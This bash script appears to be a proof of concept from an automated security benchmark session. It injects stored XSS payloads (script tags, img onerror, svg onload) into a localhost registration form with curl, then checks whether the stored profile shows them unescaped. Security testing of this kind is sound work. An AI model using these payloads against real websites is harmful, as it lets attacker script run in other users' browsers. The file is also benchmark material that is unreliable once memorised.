#!/bin/bash
# POC: Demonstrates Stored XSS vulnerability in registration endpoint by injecting XSS payloads in user fields
# Target: ./repo
# Created: 2025-11-10T14:47:27.690Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# Stored XSS in Registration Fields POC
# This script demonstrates how XSS payloads can be injected in the registration endpoint
# and stored in the database without sanitization

TARGET="http://localhost:3000"
TIMESTAMP=$(date +%s)

echo "[*] Stored XSS in Registration Fields POC"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Script tag in first_name field
echo "[+] Test 1: Injecting <script> tag in first_name field"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/register" \
  --data-urlencode "username=xss_test_script_$TIMESTAMP" \
  --data-urlencode 'first_name=<script>alert("XSS")</script>' \
  --data-urlencode 'last_name=TestUser' \
  --data-urlencode 'email=xss1@example.com' \
  --data-urlencode 'password=test123')

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [[ "$HTTP_CODE" == "302" || "$HTTP_CODE" == "200" ]]; then
    echo "[✓] Payload accepted! HTTP $HTTP_CODE"
    echo "[✓] XSS payload stored without sanitization"
else
    echo "[✗] Request failed with HTTP $HTTP_CODE"
fi
echo ""

# Test 2: Event handler (onerror) in first_name field
echo "[+] Test 2: Injecting event handler in first_name field"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/register" \
  --data-urlencode "username=xss_test_event_$TIMESTAMP" \
  --data-urlencode 'first_name=<img src=x onerror="alert('"'"'XSS'"'"')">' \
  --data-urlencode 'last_name=TestUser' \
  --data-urlencode 'email=xss2@example.com' \
  --data-urlencode 'password=test123')

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [[ "$HTTP_CODE" == "302" || "$HTTP_CODE" == "200" ]]; then
    echo "[✓] Payload accepted! HTTP $HTTP_CODE"
    echo "[✓] Event handler payload stored without sanitization"
else
    echo "[✗] Request failed with HTTP $HTTP_CODE"
fi
echo ""

# Test 3: SVG with onload in first_name field
echo "[+] Test 3: Injecting SVG with onload in first_name field"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/register" \
  --data-urlencode "username=xss_test_svg_$TIMESTAMP" \
  --data-urlencode 'first_name=<svg onload="alert('"'"'XSS'"'"')"></svg>' \
  --data-urlencode 'last_name=TestUser' \
  --data-urlencode 'email=xss3@example.com' \
  --data-urlencode 'password=test123')

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [[ "$HTTP_CODE" == "302" || "$HTTP_CODE" == "200" ]]; then
    echo "[✓] Payload accepted! HTTP $HTTP_CODE"
    echo "[✓] SVG payload stored without sanitization"
else
    echo "[✗] Request failed with HTTP $HTTP_CODE"
fi
echo ""

# Test 4: XSS in email field
echo "[+] Test 4: Injecting XSS payload in email field"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/register" \
  --data-urlencode "username=xss_test_email_$TIMESTAMP" \
  --data-urlencode 'first_name=TestUser' \
  --data-urlencode 'last_name=Test' \
  --data-urlencode 'email=<script>alert("XSS")</script>' \
  --data-urlencode 'password=test123')

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [[ "$HTTP_CODE" == "302" || "$HTTP_CODE" == "200" ]]; then
    echo "[✓] Payload accepted! HTTP $HTTP_CODE"
    echo "[✓] XSS in email field stored without sanitization"
else
    echo "[✗] Request failed with HTTP $HTTP_CODE"
fi
echo ""

# Test 5: Verify stored XSS by attempting to retrieve user profile
echo "[+] Test 5: Verifying stored XSS by logging in and accessing profile"
RESPONSE=$(curl -s -X POST "$TARGET/login" \
  --data-urlencode "username=xss_test_script_$TIMESTAMP" \
  --data-urlencode 'password=test123' \
  -c /tmp/cookies.txt)

if [[ "$RESPONSE" == *"redirect"* ]] || [[ "$RESPONSE" == *"profile"* ]]; then
    echo "[✓] Login successful, checking profile for stored payload"
    
    # Try to access profile
    PROFILE=$(curl -s "$TARGET/profile" -b /tmp/cookies.txt)
    
    if [[ "$PROFILE" == *"<script>"* ]] || [[ "$PROFILE" == *"alert"* ]]; then
        echo "[✓] STORED XSS CONFIRMED: JavaScript payload found in stored user data"
    else
        echo "[!] Profile retrieved but XSS payload may be rendered or escaped"
    fi
else
    echo "[!] Could not verify stored XSS via profile (may require additional session handling)"
fi
echo ""

echo "[*] POC Complete - Multiple XSS payloads were accepted and stored without sanitization"